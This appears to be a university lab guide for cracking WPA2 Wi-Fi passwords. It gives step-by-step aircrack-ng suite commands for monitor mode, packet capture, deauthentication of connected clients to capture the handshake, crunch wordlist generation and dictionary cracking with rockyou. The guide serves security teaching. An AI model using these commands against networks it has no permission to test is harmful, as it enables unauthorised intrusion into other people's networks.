# Crack WPA2 Password
## How WPA2 works

TO DO


# Read WiFi Network Interface Data

 1. Authenticate a superuser
 2. Execute `iw` command in order to find and manipulate your wireless devices and their configuration 
```
sudo su 
iw dev
```
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/1.%20iw%20dev.png?raw=true)

# Start cracking

 * The first thing we have to do is to set our network card in *monitor mode* which allows to monitor all traffic received on a wireless channel
    * `airmon-ng start <INTERFACE_NAME>`
 * Check again your network wireless card name using `iw dev` command
     * `iw dev`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/2.%20iw%20dev.png?raw=true)
 * Let's now start `airodump-ng` in order to obtain some useful information about `AP Name`, `Channel` and `BSSID`
    * `airodump-ng <INTERFACE_NAME_MONITOR_MODE>`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/3.%20airodump-ng.png?raw=true)
 * We can now start capturing some data using (again) `airodump-ng` command
   * `airodump-ng -c <NUM_CHANNEL> --bssid <AP_MAC_ADDRESS> -w <OUTPUT_FILE_CAPTURE> <INTERFACE_NAME_MONITOR_MODE>`
 * Our goal is to capture the **WPA2 handshake**. To do that, we try to de-authenticate all hosts connected to the AP using the `aireplay-ng` command; finally, we need to wait until at least one host will  auto reconnect to the AP
   * `aireplay-ng -0 2 -a <AP_MAC_ADDRESS> <INTERFACE_NAME_MONITOR_MODE>`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/4.%20airodump-ng%20capture.png?raw=true)

 * Once the WPA2 handshake has been captured, we can start hacking the password 
v


## Bruteforce attack using dictionaries
One of the things that we will try out with breaking through WPA and WPA2, is by using a dictionary attack. Dictionary attack is a technique to break through an authentication mechanism by trying to figure out it’s decryption key or passphrase by trying out hundreds, thousands or even billions of likely possibilities. Most vulnerable victims of this attacks are Wi-Fi’s that have their password set to something simple, such as `cat`, `dog`, `airplane`, `football` and so on - like the words in a dictionary

### Create a dictionary using `cruch` tool
One of the possibility is to self create a dictionary using some CLI tools. `cruch` allows us to create dictionaries specifying many parameters such as `min` and `max` password length, `charset` and even `patterns`
 * `crunch <min_lenght> <max_lenght> charset [-t <pattern> ] -o dictionary.txt`

For example, in order to create a dictionary containing all the words from 5 to 8 chars only in lowercase, we can execute the following command
 * `crunch 5 8 qwertyuiopasdfghjklzxcvbnm -o dictionary.txt`

In our exercises, we will use some dictionaries which can be downloaded from the Iternet. The first one is called `john dictionary` whereas the second one is called `rockyou dictionary`
 1. `sudo su`
 2. `sudo apt install john`
 3. `mkdir /usr/share/rockyou`
 4. `cd /usr/share/rockyou`
 5. `wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt`

After that, the dictionaries can be found in the `/usr/share/john` and `/usr/share/rockyou` folders, respectively.

## Start the bruteforce attack
We can now start the bruteforce attack. We suggest to use `john` and/or `rockyou` dictionary to complete the exercise before the end of the laboratory session

 * `aircrack-ng -w <YOUR_DICTIONARY_FILE> <OUTPUT_FILE_CAPTURE>.cap`
![alt text](https://github.com/fpacenza/NetworkAndSecurity/blob/main/WEP_WPA2_Crack/WPA2/5.%20bruteforce.png?raw=true)

## Stop Monitor Mode

Remember to disable the **monitor mode** from your wireless network card
 * `airmon-ng stop <INTERFACE_NAME>`